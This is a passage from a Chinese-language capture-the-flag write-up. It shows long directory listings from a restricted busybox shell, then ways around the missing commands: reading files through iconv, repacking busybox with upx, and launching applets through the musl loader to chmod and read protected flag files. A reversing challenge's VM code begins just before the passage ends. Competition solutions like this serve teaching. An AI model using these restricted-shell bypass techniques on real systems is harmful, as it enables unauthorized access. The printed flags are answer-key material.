65534    65534           12 May  9 20:49 getopt -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 hostname -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 ionice -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 iostat -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 ipcalc -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 kill -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 login -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 ls -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 lzop -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 makemime -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 mkdir -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 mknod -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 mktemp -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 mount -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 mountpoint -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 mpstat -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 netstat -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 nice -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 pidof -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 ping -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 ping6 -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 pipe_progress -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 printenv -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 ps -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 pwd -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 reformime -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 rm -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 rmdir -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 run-parts -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 setpriv -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 setserial -&gt; &#x2F;bin&#x2F;busybox-r-sr-xr-x    1 1338     1338         19936 Jun 13 12:48 shelllrwxrwxrwx    1 65534    65534           12 May  9 20:49 sleep -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 stat -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 stty -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 sync -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 tar -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 true -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 umount -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 uname -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 usleep -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 watch -&gt; &#x2F;bin&#x2F;busybox&gt; total 236drwxr-xr-x    2 65534    65534         4096 May  9 20:49 .drwxr-xr-x   20 0        0             4096 Jun 13 14:28 ..lrwxrwxrwx    1 65534    65534           12 May  9 20:49 acpid -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 adjtimex -&gt; &#x2F;bin&#x2F;busybox-rwxr-xr-x    1 65534    65534       211304 Jan 10  2019 apklrwxrwxrwx    1 65534    65534           12 May  9 20:49 arp -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 blkid -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 blockdev -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 depmod -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 fbsplash -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 fdisk -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 findfs -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 fsck -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 fstrim -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 getty -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 halt -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 hdparm -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 hwclock -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 ifconfig -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 ifdown -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 ifenslave -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 ifup -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 init -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 inotifyd -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 insmod -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 ip -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 ipaddr -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 iplink -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 ipneigh -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 iproute -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 iprule -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 iptunnel -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 klogd -&gt; &#x2F;bin&#x2F;busybox-rwxr-xr-x    1 65534    65534          393 Mar 19  2019 ldconfiglrwxrwxrwx    1 65534    65534           12 May  9 20:49 loadkmap -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 logread -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 losetup -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 lsmod -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 mdev -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 mkdosfs -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 mkfs.vfat -&gt; &#x2F;bin&#x2F;busybox-rwxr-xr-x    1 65534    65534        13968 Jan 23  2019 mkmntdirslrwxrwxrwx    1 65534    65534           12 May  9 20:49 mkswap -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 modinfo -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 modprobe -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 nameif -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 nologin -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 poweroff -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 raidautorun -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 reboot -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 rmmod -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 route -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 setconsole -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 slattach -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 swapoff -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 swapon -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 switch_root -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 sysctl -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 syslogd -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 tunctl -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 udhcpc -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 vconfig -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 watchdog -&gt; &#x2F;bin&#x2F;busybox&gt; total 1992drwxr-xr-x    2 65534    65534         4096 Jun 13 14:28 .drwxr-xr-x    8 65534    65534         4096 Jun 13 14:28 ..lrwxrwxrwx    1 65534    65534           12 May  9 20:49 [ -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 [[ -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 basename -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 beep -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 blkdiscard -&gt; &#x2F;bin&#x2F;busybox-rwxr-xr-x    1 65534    65534        14208 Jan 29  2019 c_rehashlrwxrwxrwx    1 65534    65534           12 May  9 20:49 cal -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 chvt -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 cksum -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 clear -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 cpio -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 crontab -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 cryptpw -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 dc -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 deallocvt -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 dirname -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 dos2unix -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 du -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 eject -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 env -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 expr -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 factor -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 fallocate -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 flock -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 fold -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 free -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 fuser -&gt; &#x2F;bin&#x2F;busybox-rwxr-xr-x    1 65534    65534        36728 Mar 19  2019 getconf-rwxr-xr-x    1 65534    65534        51912 Mar 19  2019 getentlrwxrwxrwx    1 65534    65534           12 May  9 20:49 groups -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 hostid -&gt; &#x2F;bin&#x2F;busybox-rwxr-xr-x    1 65534    65534        25216 Mar 19  2019 iconvlrwxrwxrwx    1 65534    65534           12 May  9 20:49 id -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 install -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 ipcrm -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 ipcs -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 killall -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           29 May  9 20:49 ldd -&gt; ..&#x2F;..&#x2F;lib&#x2F;ld-musl-x86_64.so.1lrwxrwxrwx    1 65534    65534           12 May  9 20:49 logger -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 lsof -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 lsusb -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 lzcat -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 lzma -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 lzopcat -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 md5sum -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 mesg -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 microcom -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 mkfifo -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 mkpasswd -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 nmeter -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 nohup -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 nproc -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 nsenter -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 nslookup -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 openvt -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 passwd -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 patch -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 pgrep -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 pkill -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 pmap -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 printf -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 pstree -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 pwdx -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 readlink -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 realpath -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 renice -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 reset -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 resize -&gt; &#x2F;bin&#x2F;busybox-rwxr-xr-x    1 65534    65534        83744 Nov 15  2018 scanelflrwxrwxrwx    1 65534    65534           12 May  9 20:49 seq -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 setkeycodes -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 setsid -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 sha1sum -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 sha256sum -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 sha3sum -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 sha512sum -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 showkey -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 shred -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 shuf -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 smemcap -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 split -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 sum -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 test -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 time -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 timeout -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 top -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 truncate -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 tty -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 ttysize -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 udhcpc6 -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 unix2dos -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 unlink -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 unlzma -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 unlzop -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 unshare -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 unxz -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 uptime -&gt; &#x2F;bin&#x2F;busybox-rwxr-xr-x    1 65534    65534      1810232 Dec 28  2018 upxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 vlock -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 volname -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 wc -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 which -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 whoami -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 yes -&gt; &#x2F;bin&#x2F;busybox&gt; total 24</code></pre><ul><li>iconv命令可以使用：iconv - convert text from one character encoding to another</li></ul><pre class="language-sh" data-language="sh"><code class="language-sh">&gt; iconv README.flagCTF&#123;4ll_D474_5h4ll_B3_Fr33&#125;&gt; iconv ORME.flagiconv: ORME.flag: Permission denied&gt;</code></pre><ul><li><p>可以看到README.flag文件中的flag</p></li><li><p>upx命令可用：upx - compress or expand executable files</p></li><li><p>利用upx从busybox提取chmod cat </p></li></ul><pre class="language-sh" data-language="sh"><code class="language-sh">&gt; upx -o &#x2F;tmp&#x2F;chmod &#x2F;bin&#x2F;busybox                       Ultimate Packer for eXecutables                          Copyright (C) 1996 - 2018UPX 3.95        Markus Oberhumer, Laszlo Molnar &amp; John Reiser   Aug 26th 2018        File size         Ratio      Format      Name   --------------------   ------   -----------   -----------    796240 -&gt;    451332   56.68%   linux&#x2F;amd64   chmodPacked 1 file.&gt; upx -o &#x2F;tmp&#x2F;cat &#x2F;bin&#x2F;busybox                       Ultimate Packer for eXecutables                          Copyright (C) 1996 - 2018UPX 3.95        Markus Oberhumer, Laszlo Molnar &amp; John Reiser   Aug 26th 2018        File size         Ratio      Format      Name   --------------------   ------   -----------   -----------    796240 -&gt;    451332   56.68%   linux&#x2F;amd64   catPacked 1 file.&gt; &#x2F;tmp&#x2F;chmod 777 ORME.flag README.flag&gt; ls -altotal 12drwxrwxrwt    2 0        0               80 Sep 20 14:22 .drwxr-xr-x   20 0        0             4096 Jun 13 14:28 ..-rwxrwxrwx    1 1338     1338            33 Sep 20 14:22 ORME.flag-rwxrwxrwx    1 1338     1338            28 Sep 20 14:22 README.flag&gt; &#x2F;tmp&#x2F;cat ORME.flag README.flagCTF&#123;Th3r3_1s_4lw4y5_4N07h3r_W4y&#125;CTF&#123;4ll_D474_5h4ll_B3_Fr33&#125;&gt;</code></pre><ul><li>另一种思路：利用ld-musl-x86_64.so.1(/lib/ld-musl-x86_64.so.1 is in musl 0.9.15-1.This file is owned by root:root, with mode 0o777.It is a symlink to /lib/x86_64-linux-musl/libc.so)</li></ul><pre class="language-sh" data-language="sh"><code class="language-sh">&gt; &#x2F;lib&#x2F;ld-musl-x86_64.so.1 &#x2F;bin&#x2F;busybox chmod 777 ORME.flag README.flag&gt; ls -altotal 12drwxrwxrwt    2 0        0               80 Sep 20 15:48 .drwxr-xr-x   20 0        0             4096 Jun 13 14:28 ..-rwxrwxrwx    1 1338     1338            33 Sep 20 15:48 ORME.flag-rwxrwxrwx    1 1338     1338            28 Sep 20 15:48 README.flag&gt; &#x2F;lib&#x2F;ld-musl-x86_64.so.1 &#x2F;bin&#x2F;busybox cat ORME.flag README.flagCTF&#123;Th3r3_1s_4lw4y5_4N07h3r_W4y&#125;CTF&#123;4ll_D474_5h4ll_B3_Fr33&#125;</code></pre><ul><li>==<strong>flag:CTF{4ll_D474_5h4ll_B3_Fr33}</strong>==</li><li>==<strong>flag:CTF{Th3r3_1s_4lw4y5_4N07h3r_W4y}</strong>==</li></ul><h2 id="07-FriendSpaceBookPlusAllAccessRedPremium-com-reversing"><a href="#07-FriendSpaceBookPlusAllAccessRedPremium-com-reversing" class="headerlink" title="07 FriendSpaceBookPlusAllAccessRedPremium.com(reversing)"></a>07 FriendSpaceBookPlusAllAccessRedPremium.com(reversing)</h2><ul><li>解压得到：program  vm.py</li></ul><pre class="language-sh" data-language="sh"><code class="language-sh">╭─r10@GSCR10 &#x2F;mnt&#x2F;c&#x2F;Users&#x2F;R10&#x2F;Desktop&#x2F;google ctf&#x2F;ctf&#x2F;06_FriendSpaceBookPlusAllAccessRedPremium.com╰─➤  file *                                                                                   06_FriendSpaceBookPlusAllAccessRedPremium.com.zip: Zip archive data, at least v2.0 to extractprogram:                                           UTF-8 Unicode textvm.py:                                             Python script, UTF-8 Unicode text executable</code></pre><ul><li>vm.py</li></ul><pre class="language-py" data-language="py"><code class="language-py"><span class="token keyword">import</span> sys<span class="token comment"># Implements a simple stack-based VM</span><span class="token keyword">class</span> <span class="token class-name">VM</span><span class="token punctuation">:</span>  <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> rom<span class="token punctuation">)</span><span class="token punctuation">:</span>    self<span class="token punctuation">.</span>rom <span class="token operator">=</span> rom    self<span class="token punctuation">.</span>accumulator1 <span class="token operator">=</span> <span class="token number">0</span>    self<span class="token punctuation">.</span>accumulator2 <span class="token operator">=</span> <span class="token number">0</span>    self<span class="token punctuation">.</span>instruction_pointer <span class="token operator">=</span> <span class="token number">1</span>    self<span class="token punctuation">.</span>stack <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>  <span class="token keyword">def</span> <span class="token function">step</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>    cur_ins <span class="token operator">=</span> self<span class="token punctuation">.</span>rom<span class="token punctuation">[</span>self<span class="token punctuation">.</span>instruction_pointer<span class="token punctuation">]</span>    self<span class="token punctuation">.</span>instruction_pointer <span class="token operator">+=</span> <span class="token number">1</span>    fn <span class="token operator">=</span> VM<span class="token punctuation">.</span>OPERATIONS<span class="token punctuation">.</span>get<span class="token punctuation">(</span>cur_ins<span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> cur_ins<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'🖋'</span><span class="token punctuation">:</span>      <span class="token keyword">return</span>    <span class="token keyword">if</span> fn <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>      <span class="token keyword">raise</span> RuntimeError<span class="token punctuation">(</span><span class="token string">"Unknown instruction '&#123;&#125;' at &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>          <span class="token builtin">repr</span><span class="token punctuation">(</span>cur_ins<span class="token punctuation">)</span><span class="token punctuation">,</span> self<span class="token punctuation">.</span>instruction_pointer <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>      fn<span class="token punctuation">(</span>self<span class="token punctuation">)</span>  <span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>    self<span class="token punctuation">.</span>stack<span class="token punctuation">.</span>append<span class="token punctuation">(</span>self<span class="token punctuation">.</span>stack<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> self<span class="token punctuation">.</span>stack<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token keyword">def</span> <span class="token function">sub</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>    a <span class="token operator">=</span> self<span class="token punctuation">.</span>stack<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span>    b <span class="token operator">=</span> self<span class="token punctuation">.</span>stack<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span>    self<span class="token punctuation">.</span>stack<span class="token punctuation">.</span>append<span class="token punctuation">(</span>b 